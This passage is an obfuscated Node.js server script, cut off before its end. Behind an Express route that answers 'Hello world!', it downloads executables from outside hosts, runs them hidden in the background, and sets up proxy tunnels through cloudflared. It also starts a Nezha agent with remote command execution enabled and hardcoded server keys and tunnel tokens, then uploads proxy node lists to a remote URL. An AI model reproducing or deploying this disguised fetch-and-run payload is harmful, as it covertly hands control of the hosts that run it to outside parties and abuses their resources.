const _0x2a50c9=_0x3ff1;(function(_0x57f8f4,_0x2324de){const _0x583a2d={_0x487d95:0x230,_0x301a26:0x245,_0xd48f60:0x1af,_0x4bd1c9:0x25a,_0x20059d:0x22a,_0x153a53:0x1fa,_0x208422:0x1c0,_0x166c00:0x224,_0x4e6994:0x228},_0x58b9d4=_0x3ff1,_0x272d91=_0x57f8f4();while(!![]){try{const _0x116d6c=-parseInt(_0x58b9d4(_0x583a2d._0x487d95))/0x1+parseInt(_0x58b9d4(_0x583a2d._0x301a26))/0x2+parseInt(_0x58b9d4(_0x583a2d._0xd48f60))/0x3*(parseInt(_0x58b9d4(_0x583a2d._0x4bd1c9))/0x4)+-parseInt(_0x58b9d4(_0x583a2d._0x20059d))/0x5*(-parseInt(_0x58b9d4(_0x583a2d._0x153a53))/0x6)+-parseInt(_0x58b9d4(_0x583a2d._0x208422))/0x7*(parseInt(_0x58b9d4(0x1d3))/0x8)+parseInt(_0x58b9d4(_0x583a2d._0x166c00))/0x9*(parseInt(_0x58b9d4(0x1b4))/0xa)+-parseInt(_0x58b9d4(_0x583a2d._0x4e6994))/0xb*(parseInt(_0x58b9d4(0x23b))/0xc);if(_0x116d6c===_0x2324de)break;else _0x272d91['push'](_0x272d91['shift']());}catch(_0x5f5c73){_0x272d91['push'](_0x272d91['shift']());}}}(_0x298e,0x405da));const express=require(_0x2a50c9(0x1a0)),app=express(),axios=require(_0x2a50c9(0x265)),os=require('os'),fs=require('fs'),path=require(_0x2a50c9(0x1c4)),{promisify}=require(_0x2a50c9(0x249)),exec=promisify(require('child_process')[_0x2a50c9(0x235)]),{execSync}=require(_0x2a50c9(0x266)),UPLOAD_URL=process['env'][_0x2a50c9(0x25c)]||'',PROJECT_URL=process['env'][_0x2a50c9(0x20b)]||'',AUTO_ACCESS=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x206)]||![],FILE_PATH=process[_0x2a50c9(0x1a7)]['FILE_PATH']||_0x2a50c9(0x200),SUB_PATH=process[_0x2a50c9(0x1a7)]['SUB_PATH']||_0x2a50c9(0x1eb),PORT=process['env'][_0x2a50c9(0x1da)]||process[_0x2a50c9(0x1a7)][_0x2a50c9(0x1f4)]||0xbb8,UUID=process[_0x2a50c9(0x1a7)]['UUID']||'7e989a9d-0017-4356-9574-c6b0432cfefb',NEZHA_SERVER=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x20c)]||_0x2a50c9(0x210),NEZHA_PORT=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x1b2)]||'',NEZHA_KEY=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x1f6)]||_0x2a50c9(0x22b),ARGO_DOMAIN=process['env'][_0x2a50c9(0x1cc)]||_0x2a50c9(0x1b1),ARGO_AUTH=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x1e0)]||_0x2a50c9(0x1d1),ARGO_PORT=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x209)]||0x42cc,CFIP=process['env'][_0x2a50c9(0x255)]||'cf.877774.xyz',CFPORT=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x1f9)]||0x1bb,NAME=process[_0x2a50c9(0x1a7)][_0x2a50c9(0x214)]||_0x2a50c9(0x1c1);!fs[_0x2a50c9(0x212)](FILE_PATH)?(fs[_0x2a50c9(0x1ed)](FILE_PATH),console['log'](FILE_PATH+_0x2a50c9(0x26c))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2ccd7d={_0x14889f:0x1ec,_0x1fbb41:0x1cb,_0x51aeb8:0x1b6},_0x1636c9=_0x2a50c9,_0x5a30f4='abcdefghijklmnopqrstuvwxyz';let _0x2d4c13='';for(let _0x11cc28=0x0;_0x11cc28<0x6;_0x11cc28++){_0x2d4c13+=_0x5a30f4[_0x1636c9(_0x2ccd7d._0x14889f)](Math[_0x1636c9(0x1f8)](Math[_0x1636c9(_0x2ccd7d._0x1fbb41)]()*_0x5a30f4[_0x1636c9(_0x2ccd7d._0x51aeb8)]));}return _0x2d4c13;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2a50c9(0x1c9)](FILE_PATH,npmName),phpPath=path[_0x2a50c9(0x1c9)](FILE_PATH,phpName),webPath=path[_0x2a50c9(0x1c9)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2a50c9(0x1c9)](FILE_PATH,_0x2a50c9(0x202)),listPath=path[_0x2a50c9(0x1c9)](FILE_PATH,_0x2a50c9(0x1bb)),bootLogPath=path[_0x2a50c9(0x1c9)](FILE_PATH,_0x2a50c9(0x1ad)),configPath=path[_0x2a50c9(0x1c9)](FILE_PATH,'config.json');function deleteNodes(){const _0x1e7ae4={_0x535bc4:0x1e6,_0x23a178:0x1d9,_0x594ab8:0x204,_0x35246a:0x219,_0x3a2fdd:0x1ac},_0x224613=_0x2a50c9;try{if(!UPLOAD_URL)return;if(!fs[_0x224613(0x212)](subPath))return;let _0x55b11a;try{_0x55b11a=fs[_0x224613(0x250)](subPath,_0x224613(0x204));}catch{return null;}const _0x2ac310=Buffer[_0x224613(_0x1e7ae4._0x535bc4)](_0x55b11a,_0x224613(_0x1e7ae4._0x23a178))[_0x224613(0x1ba)](_0x224613(_0x1e7ae4._0x594ab8)),_0x13425d=_0x2ac310['split']('\x0a')['filter'](_0x2fe511=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2fe511));if(_0x13425d[_0x224613(0x1b6)]===0x0)return;return axios[_0x224613(0x20d)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x224613(_0x1e7ae4._0x35246a)]({'nodes':_0x13425d}),{'headers':{'Content-Type':'application/json'}})[_0x224613(_0x1e7ae4._0x3a2fdd)](_0x58c58c=>{return null;}),null;}catch(_0xba56a6){return null;}}function cleanupOldFiles(){const _0x17bc73={_0x19ece0:0x1a4},_0x3f0fb7={_0x3c3020:0x203},_0xdc5b04=_0x2a50c9;try{const _0x2b2d6b=fs[_0xdc5b04(_0x17bc73._0x19ece0)](FILE_PATH);_0x2b2d6b[_0xdc5b04(0x1ef)](_0x6392c5=>{const _0x269b68=_0xdc5b04,_0xd427d1=path[_0x269b68(0x1c9)](FILE_PATH,_0x6392c5);try{const _0x1c966b=fs['statSync'](_0xd427d1);_0x1c966b[_0x269b68(0x223)]()&&fs[_0x269b68(_0x3f0fb7._0x3c3020)](_0xd427d1);}catch(_0x5117f8){}});}catch(_0x5b480a){}}app[_0x2a50c9(0x1e4)]('/',function(_0x15c1cf,_0x1f61ce){const _0x5dfb68={_0xe801ac:0x216},_0x4bc904=_0x2a50c9;_0x1f61ce[_0x4bc904(_0x5dfb68._0xe801ac)](_0x4bc904(0x244));});async function generateConfig(){const _0x2d1c7b={_0x19179b:0x1d5,_0xb8fbb:0x211,_0x1ef7a5:0x232,_0x2eab32:0x221,_0x33d5ed:0x1a6,_0x3b2083:0x26d,_0x2dff95:0x1d8,_0x3528a7:0x232,_0x373d50:0x236,_0xd19ebc:0x24b,_0x57e7c0:0x259,_0x91664d:0x1b3,_0x41f404:0x263,_0x171c49:0x26a,_0x55dd31:0x1c7},_0x55a2b6=_0x2a50c9,_0xf74a93={'log':{'access':_0x55a2b6(_0x2d1c7b._0x19179b),'error':_0x55a2b6(0x1d5),'loglevel':_0x55a2b6(0x232)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x55a2b6(_0x2d1c7b._0xb8fbb)}],'decryption':_0x55a2b6(_0x2d1c7b._0x1ef7a5),'fallbacks':[{'dest':0xbb9},{'path':_0x55a2b6(_0x2d1c7b._0x2eab32),'dest':0xbba},{'path':_0x55a2b6(_0x2d1c7b._0x33d5ed),'dest':0xbbb},{'path':_0x55a2b6(0x1f1),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x55a2b6(_0x2d1c7b._0x3b2083),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x55a2b6(_0x2d1c7b._0x2dff95),'security':_0x55a2b6(_0x2d1c7b._0x1ef7a5)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x55a2b6(0x26d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x55a2b6(_0x2d1c7b._0x3528a7),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x55a2b6(0x259),'tls',_0x55a2b6(0x263)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x55a2b6(0x240),'protocol':_0x55a2b6(_0x2d1c7b._0x373d50),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x55a2b6(0x259),_0x55a2b6(0x1b3),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x55a2b6(0x240),'protocol':_0x55a2b6(_0x2d1c7b._0xd19ebc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x55a2b6(0x232),'wsSettings':{'path':_0x55a2b6(0x1f1)}},'sniffing':{'enabled':!![],'destOverride':[_0x55a2b6(_0x2d1c7b._0x57e7c0),_0x55a2b6(_0x2d1c7b._0x91664d),_0x55a2b6(_0x2d1c7b._0x41f404)],'metadataOnly':![]}}],'dns':{'servers':[_0x55a2b6(_0x2d1c7b._0x171c49)]},'outbounds':[{'protocol':_0x55a2b6(0x1e7),'tag':_0x55a2b6(_0x2d1c7b._0x55dd31)},{'protocol':'blackhole','tag':'block'}]};fs[_0x55a2b6(0x1d6)](path['join'](FILE_PATH,_0x55a2b6(0x225)),JSON['stringify'](_0xf74a93,null,0x2));}function getSystemArchitecture(){const _0x28cd4c={_0x5acf75:0x1ca,_0x48d55b:0x1fb,_0x27b7cc:0x22d},_0x5970fe=_0x2a50c9,_0x1c5918=os[_0x5970fe(_0x28cd4c._0x5acf75)]();return _0x1c5918===_0x5970fe(0x1fb)||_0x1c5918===_0x5970fe(0x1f0)||_0x1c5918===_0x5970fe(0x208)?_0x5970fe(_0x28cd4c._0x48d55b):_0x5970fe(_0x28cd4c._0x27b7cc);}function _0x3ff1(_0x4ce418,_0x4ea2b1){const _0x298e6d=_0x298e();return _0x3ff1=function(_0x3ff131,_0x2a16bc){_0x3ff131=_0x3ff131-0x19f;let _0x3a6aee=_0x298e6d[_0x3ff131];return _0x3a6aee;},_0x3ff1(_0x4ce418,_0x4ea2b1);}function downloadFile(_0x3c5323,_0x499b4b,_0x29bd52){const _0x554901={_0x2fca0a:0x1ed,_0x26f294:0x1b5,_0x34c7eb:0x1e4,_0x112a03:0x1ac},_0x1ee287={_0x390112:0x239,_0x176bc0:0x1e2,_0x4d3ec3:0x1cd,_0x5bd9a3:0x1d7},_0x1e7053={_0xb673c8:0x234,_0x51d924:0x1cf},_0x12662c=_0x2a50c9,_0x1bf893=_0x3c5323;!fs['existsSync'](FILE_PATH)&&fs[_0x12662c(_0x554901._0x2fca0a)](FILE_PATH,{'recursive':!![]});const _0x262c73=fs[_0x12662c(_0x554901._0x26f294)](_0x1bf893);axios({'method':_0x12662c(_0x554901._0x34c7eb),'url':_0x499b4b,'responseType':_0x12662c(0x25e)})[_0x12662c(0x21f)](_0x3352e5=>{const _0x298167={_0x5e2237:0x22f,_0x4bbc50:0x1cd},_0x3ba847={_0x3fafc9:0x239,_0x3d2736:0x22f},_0x331a0a=_0x12662c;_0x3352e5['data'][_0x331a0a(_0x1e7053._0xb673c8)](_0x262c73),_0x262c73['on'](_0x331a0a(_0x1e7053._0x51d924),()=>{const _0xf95006=_0x331a0a;_0x262c73['close'](),console['log'](_0xf95006(_0x3ba847._0x3fafc9)+path[_0xf95006(_0x3ba847._0x3d2736)](_0x1bf893)+_0xf95006(0x269)),_0x29bd52(null,_0x1bf893);}),_0x262c73['on'](_0x331a0a(0x1d7),_0x20aa75=>{const _0x3dd6a7=_0x331a0a;fs['unlink'](_0x1bf893,()=>{});const _0x4f6137=_0x3dd6a7(0x239)+path[_0x3dd6a7(_0x298167._0x5e2237)](_0x1bf893)+_0x3dd6a7(0x1e2)+_0x20aa75[_0x3dd6a7(_0x298167._0x4bbc50)];console['error'](_0x4f6137),_0x29bd52(_0x4f6137);});})[_0x12662c(_0x554901._0x112a03)](_0xb10ed3=>{const _0xba4288=_0x12662c,_0x1cd503=_0xba4288(_0x1ee287._0x390112)+path[_0xba4288(0x22f)](_0x1bf893)+_0xba4288(_0x1ee287._0x176bc0)+_0xb10ed3[_0xba4288(_0x1ee287._0x4d3ec3)];console[_0xba4288(_0x1ee287._0x5bd9a3)](_0x1cd503),_0x29bd52(_0x1cd503);});}async function downloadFilesAndRun(){const _0x308700={_0x2a9895:0x247,_0x5106e9:0x207,_0x11eb55:0x222,_0x494acd:0x242,_0x55062f:0x227,_0xe375c6:0x1be,_0xaddb28:0x252,_0x1e914c:0x1a2,_0x12c1fb:0x25d,_0x1f5442:0x1f3,_0x4ee2fb:0x20e,_0x312a6b:0x1c9,_0x51942f:0x252,_0x7ff64c:0x248,_0x566459:0x1ff,_0x38bffd:0x21b,_0x140f0c:0x23f,_0x5da31a:0x1f2,_0x4d87da:0x1d7,_0xddb35:0x253,_0x47b438:0x1fc,_0x10d75b:0x1d7,_0x1667e2:0x212,_0xfb31f0:0x25b,_0x4cc5ce:0x1aa,_0x257f06:0x1d2,_0x57c793:0x1c8},_0x553a9c={_0x327112:0x1ef},_0x41f8c7={_0x141567:0x1fe,_0xff1418:0x21d},_0x49ef3f=_0x2a50c9,_0x1a5110=getSystemArchitecture(),_0x24e6d2=getFilesForArchitecture(_0x1a5110);if(_0x24e6d2['length']===0x0){console[_0x49ef3f(_0x308700._0x2a9895)](_0x49ef3f(_0x308700._0x5106e9));return;}const _0x4c9660=_0x24e6d2[_0x49ef3f(_0x308700._0x11eb55)](_0x4fa07c=>{return new Promise((_0x31e1e5,_0x59c9e2)=>{const _0x2fe1f5=_0x3ff1;downloadFile(_0x4fa07c[_0x2fe1f5(_0x41f8c7._0x141567)],_0x4fa07c[_0x2fe1f5(_0x41f8c7._0xff1418)],(_0x58e3eb,_0x5b6b83)=>{_0x58e3eb?_0x59c9e2(_0x58e3eb):_0x31e1e5(_0x5b6b83);});});});try{await Promise[_0x49ef3f(0x260)](_0x4c9660);}catch(_0xf077ca){console['error']('Error\x20downloading\x20files:',_0xf077ca);return;}function _0x3d8ef6(_0x1616fc){const _0x29c3f7={_0x31970f:0x1b8},_0x2a32c7={_0x21fe6c:0x247},_0x370595=_0x49ef3f,_0x18ccdf=0x1fd;_0x1616fc[_0x370595(_0x553a9c._0x327112)](_0x46dbe8=>{const _0x2e0bed=_0x370595;fs['existsSync'](_0x46dbe8)&&fs[_0x2e0bed(_0x29c3f7._0x31970f)](_0x46dbe8,_0x18ccdf,_0x25557b=>{const _0x55b687=_0x2e0bed;_0x25557b?console['error']('Empowerment\x20failed\x20for\x20'+_0x46dbe8+':\x20'+_0x25557b):console[_0x55b687(_0x2a32c7._0x21fe6c)](_0x55b687(0x241)+_0x46dbe8+':\x20'+_0x18ccdf[_0x55b687(0x1ba)](0x8));});});}const _0x3a3981=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3d8ef6(_0x3a3981);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xee8f53=NEZHA_SERVER[_0x49ef3f(_0x308700._0x494acd)](':')?NEZHA_SERVER[_0x49ef3f(_0x308700._0x55062f)](':')[_0x49ef3f(_0x308700._0xe375c6)]():'',_0x26e386=new Set([_0x49ef3f(_0x308700._0xaddb28),_0x49ef3f(_0x308700._0x1e914c),_0x49ef3f(0x248),_0x49ef3f(0x237),_0x49ef3f(_0x308700._0x12c1fb),'2053']),_0x117a3a=_0x26e386[_0x49ef3f(_0x308700._0x1f5442)](_0xee8f53)?_0x49ef3f(_0x308700._0x4ee2fb):'false',_0x38750d=_0x49ef3f(0x1a9)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x117a3a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x49ef3f(_0x308700._0x312a6b)](FILE_PATH,_0x49ef3f(0x23e)),_0x38750d);const _0xa8364c='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x49ef3f(0x256);try{await exec(_0xa8364c),console[_0x49ef3f(0x247)](phpName+'\x20is\x20running'),await new Promise(_0x469e97=>setTimeout(_0x469e97,0x3e8));}catch(_0x5d5932){console['error']('php\x20running\x20error:\x20'+_0x5d5932);}}else{let _0x371669='';const _0x32735e=[_0x49ef3f(_0x308700._0x51942f),'8443',_0x49ef3f(_0x308700._0x7ff64c),_0x49ef3f(0x237),'2083','2053'];_0x32735e['includes'](NEZHA_PORT)&&(_0x371669=_0x49ef3f(_0x308700._0x566459));const _0x526b4f='nohup\x20'+npmPath+_0x49ef3f(_0x308700._0x38bffd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x49ef3f(0x1ee)+NEZHA_KEY+'\x20'+_0x371669+_0x49ef3f(_0x308700._0x140f0c);try{await exec(_0x526b4f),console[_0x49ef3f(0x247)](npmName+_0x49ef3f(_0x308700._0x5da31a)),await new Promise(_0x434687=>setTimeout(_0x434687,0x3e8));}catch(_0x3fab16){console[_0x49ef3f(_0x308700._0x4d87da)](_0x49ef3f(_0x308700._0xddb35)+_0x3fab16);}}}else console[_0x49ef3f(0x247)](_0x49ef3f(0x23c));const _0x2eddd3=_0x49ef3f(0x1d2)+webPath+_0x49ef3f(0x22e)+FILE_PATH+_0x49ef3f(_0x308700._0x47b438);try{await exec(_0x2eddd3),console[_0x49ef3f(_0x308700._0x2a9895)](webName+'\x20is\x20running'),await new Promise(_0xd0fc8a=>setTimeout(_0xd0fc8a,0x3e8));}catch(_0x5e40fc){console[_0x49ef3f(_0x308700._0x10d75b)](_0x49ef3f(0x215)+_0x5e40fc);}if(fs[_0x49ef3f(_0x308700._0x1667e2)](botPath)){let _0x12c8f3;if(ARGO_AUTH[_0x49ef3f(0x25f)](/^[A-Z0-9a-z=]{120,250}$/))_0x12c8f3=_0x49ef3f(0x254)+ARGO_AUTH;else ARGO_AUTH[_0x49ef3f(0x25f)](/TunnelSecret/)?_0x12c8f3=_0x49ef3f(_0x308700._0xfb31f0)+FILE_PATH+_0x49ef3f(_0x308700._0x4cc5ce):_0x12c8f3=_0x49ef3f(0x1c3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x49ef3f(_0x308700._0x257f06)+botPath+'\x20'+_0x12c8f3+_0x49ef3f(0x24d)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x2c3e7f=>setTimeout(_0x2c3e7f,0x7d0));}catch(_0x3852c4){console[_0x49ef3f(0x1d7)](_0x49ef3f(_0x308700._0x57c793)+_0x3852c4);}}await new Promise(_0x1b027e=>setTimeout(_0x1b027e,0x1388));}function getFilesForArchitecture(_0x1b90d1){const _0x4efe28={_0x8a1191:0x1b0,_0x27ad01:0x24e,_0x4d62d5:0x1a1,_0x4620bd:0x1fb,_0x1e3581:0x21c,_0x46399b:0x1e5,_0xe7fc4a:0x1a5,_0xdbb62f:0x257},_0x2765f7=_0x2a50c9;let _0x1043b4;_0x1b90d1===_0x2765f7(0x1fb)?_0x1043b4=[{'fileName':webPath,'fileUrl':_0x2765f7(_0x4efe28._0x8a1191)},{'fileName':botPath,'fileUrl':_0x2765f7(_0x4efe28._0x27ad01)}]:_0x1043b4=[{'fileName':webPath,'fileUrl':_0x2765f7(0x1de)},{'fileName':botPath,'fileUrl':_0x2765f7(_0x4efe28._0x4d62d5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x343720=_0x1b90d1===_0x2765f7(_0x4efe28._0x4620bd)?_0x2765f7(_0x4efe28._0x1e3581):_0x2765f7(_0x4efe28._0x46399b);_0x1043b4[_0x2765f7(_0x4efe28._0xe7fc4a)]({'fileName':npmPath,'fileUrl':_0x343720});}else{const _0x13795a=_0x1b90d1===_0x2765f7(0x1fb)?_0x2765f7(_0x4efe28._0xdbb62f):_0x2765f7(0x217);_0x1043b4[_0x2765f7(_0x4efe28._0xe7fc4a)]({'fileName':phpPath,'fileUrl':_0x13795a});}}return _0x1043b4;}function _0x298e(){const _0x1bea83=['clear','toString','list.txt','pkill\x20-f\x20\x22[','platform','pop','&path=%2Fvless-argo%3Fed%3D2560#','3129GGZsPt','miget1','data','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','path','status','&fp=firefox&type=ws&host=','direct','Error\x20executing\x20command:\x20','join','arch','random','ARGO_DOMAIN','message','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','finish','firefox','eyJhIjoiNWNmZDhkODFhNTUyMWFkY2ExZDgwNTQwY2I4NjQ5ZTYiLCJ0IjoiNTA4YTMzMmQtYjA4NS00MjhjLThkMTMtMzBjNzZlOTdjOTFkIiwicyI6Ik16TXlNemxqT1RBdE1UVTBOQzAwTkdRekxXRXpNemt0WTJVeFpqYzBZVEk0T0RVeSJ9','nohup\x20','6368OEAptQ','response','/dev/null','writeFileSync','error','tcp','base64','SERVER_PORT','Error\x20in\x20startserver:','Skipping\x20adding\x20automatic\x20access\x20task','ArgoDomain:','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_AUTH','\x0a\x20\x20credentials-file:\x20','\x20failed:\x20','listen','get','https://amd64.ssss.nyc.mn/agent','from','freedom','\x22\x20>\x20/dev/null\x202>&1','?security=tls&sni=','countryCode','sub','charAt','mkdirSync','\x20-p\x20','forEach','arm64','/trojan-argo','\x20is\x20running','has','PORT','text/plain;\x20charset=utf-8','NEZHA_KEY','Error\x20reading\x20boot.log:','floor','CFPORT','18tTnrWk','arm','/config.json\x20>/dev/null\x202>&1\x20&','\x0avless://','fileName','--tls','./tmp','test','sub.txt','unlinkSync','utf-8','/sub.txt\x20saved\x20successfully','AUTO_ACCESS','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','aarch64','ARGO_PORT','rm\x20-rf\x20','PROJECT_URL','NEZHA_SERVER','post','true','tunnel.yml','nz.luyuhanv5.top:443','xtls-rprx-vision','existsSync','\x0a\x0atrojan://','NAME','web\x20running\x20error:\x20','send','https://amd64.ssss.nyc.mn/v1','Subscription\x20uploaded\x20successfully','stringify','automatic\x20access\x20task\x20added\x20successfully','\x20-s\x20','https://arm64.ssss.nyc.mn/agent','fileUrl','https://ipapi.co/json/','then','push','/vless-argo','map','isFile','9PMPWpH','config.json','ARGO_DOMAIN:','split','134893ESCdpi','Unknown','182660xSbLiX','DPgysB5rUuAihUrI3mbKm6vay19sawuv','set','amd','\x20-c\x20','basename','445246arAjcl','Add\x20automatic\x20access\x20task\x20faild:\x20','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','pipe','exec','vmess','2087','.exe\x20>\x20nul\x202>&1','Download\x20','App\x20is\x20running','84ezObkX','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x0avmess://','config.yaml','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','127.0.0.1','Empowerment\x20success\x20for\x20','includes','application/json','Hello\x20world!','879682LISXYT','del\x20/f\x20/q\x20','log','2096','util','country_code','trojan','\x0a\x20\x20\x20\x20','\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/bot','win32','readFileSync','org','443','npm\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','CFIP','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','?encryption=none&security=tls&sni=','http','4fjHQrP','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','UPLOAD_URL','2083','stream','match','all','Content-Type','tunnel.json','quic','Nodes\x20uploaded\x20successfully','axios','child_process','/api/add-subscriptions','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20successfully','https+local://8.8.8.8/dns-query','taskkill\x20/f\x20/im\x20','\x20is\x20created','vless','/vmess-argo?ed=2560','express','https://amd64.ssss.nyc.mn/bot','8443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','readdirSync','unshift','/vmess-argo','env','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','/tunnel.yml\x20run','\x20>\x20nul\x202>&1','catch','boot.log','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','925329vXmDLO','https://arm64.ssss.nyc.mn/web','miget1.lyh.hidns.co','NEZHA_PORT','tls','2926610WooMTA','createWriteStream','length','\x0a\x20\x20tunnel:\x20','chmod'];_0x298e=function(){return _0x1bea83;};return _0x298e();}function argoType(){const _0x1c6c23={_0x5b2beb:0x1c9,_0x386d73:0x1a3,_0x3ef67e:0x1df,_0x54afc1:0x1c9,_0x4e0a40:0x20f},_0x6e8747=_0x2a50c9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x6e8747(0x247)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x6e8747(0x242)]('TunnelSecret')){fs[_0x6e8747(0x1d6)](path[_0x6e8747(_0x1c6c23._0x5b2beb)](FILE_PATH,_0x6e8747(0x262)),ARGO_AUTH);const _0x48084a=_0x6e8747(0x1b7)+ARGO_AUTH['split']('\x22')[0xb]+_0x6e8747(0x1e1)+path[_0x6e8747(_0x1c6c23._0x5b2beb)](FILE_PATH,_0x6e8747(0x262))+_0x6e8747(0x233)+ARGO_DOMAIN+_0x6e8747(_0x1c6c23._0x386d73)+ARGO_PORT+_0x6e8747(_0x1c6c23._0x3ef67e);fs[_0x6e8747(0x1d6)](path[_0x6e8747(_0x1c6c23._0x54afc1)](FILE_PATH,_0x6e8747(_0x1c6c23._0x4e0a40)),_0x48084a);}else console[_0x6e8747(0x247)](_0x6e8747(0x268));}async function extractDomains(){const _0x11a175={_0x572606:0x247,_0x129a37:0x1ad,_0x5abda8:0x1b6,_0x423443:0x247,_0x44ffcf:0x1ce,_0x15b671:0x203,_0x2d32b7:0x1c8,_0xeeef6:0x1f7},_0x31489e={_0x1b4f94:0x1c2,_0x4d1af1:0x24a,_0x1915ca:0x251,_0x127807:0x1c2,_0x42debb:0x1c2,_0x42fbc8:0x1c2,_0x179378:0x1c2,_0x4378ac:0x251},_0x2a5bba={_0xe5ee95:0x26b,_0x10e28f:0x1bc},_0x532255=_0x2a50c9;let _0x3fc4a6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3fc4a6=ARGO_DOMAIN,console[_0x532255(_0x11a175._0x572606)](_0x532255(0x226),_0x3fc4a6),await _0x19f099(_0x3fc4a6);else try{const _0x144b60=fs[_0x532255(0x250)](path[_0x532255(0x1c9)](FILE_PATH,_0x532255(_0x11a175._0x129a37)),'utf-8'),_0x368609=_0x144b60[_0x532255(0x227)]('\x0a'),_0x9e1cb1=[];_0x368609['forEach'](_0x87cd90=>{const _0x1605ee=_0x532255,_0x1e51e8=_0x87cd90['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1e51e8){const _0xd64a6d=_0x1e51e8[0x1];_0x9e1cb1[_0x1605ee(0x220)](_0xd64a6d);}});if(_0x9e1cb1[_0x532255(_0x11a175._0x5abda8)]>0x0)_0x3fc4a6=_0x9e1cb1[0x0],console[_0x532255(_0x11a175._0x423443)](_0x532255(0x1dd),_0x3fc4a6),await _0x19f099(_0x3fc4a6);else{console[_0x532255(_0x11a175._0x423443)](_0x532255(_0x11a175._0x44ffcf)),fs[_0x532255(_0x11a175._0x15b671)](path['join'](FILE_PATH,_0x532255(_0x11a175._0x129a37)));async function _0x47aa06(){const _0x5333d5=_0x532255;try{process[_0x5333d5(0x1bd)]===_0x5333d5(0x24f)?await exec(_0x5333d5(_0x2a5bba._0xe5ee95)+botName+_0x5333d5(0x238)):await exec(_0x5333d5(_0x2a5bba._0x10e28f)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x5333d5(0x1e8));}catch(_0x25b1bd){}}_0x47aa06(),await new Promise(_0x116beb=>setTimeout(_0x116beb,0xbb8));const _0xc7a593=_0x532255(0x1c3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x532255(0x1d2)+botPath+'\x20'+_0xc7a593+_0x532255(0x24d)),console[_0x532255(0x247)](botName+_0x532255(0x1f2)),await new Promise(_0x37d275=>setTimeout(_0x37d275,0xbb8)),await 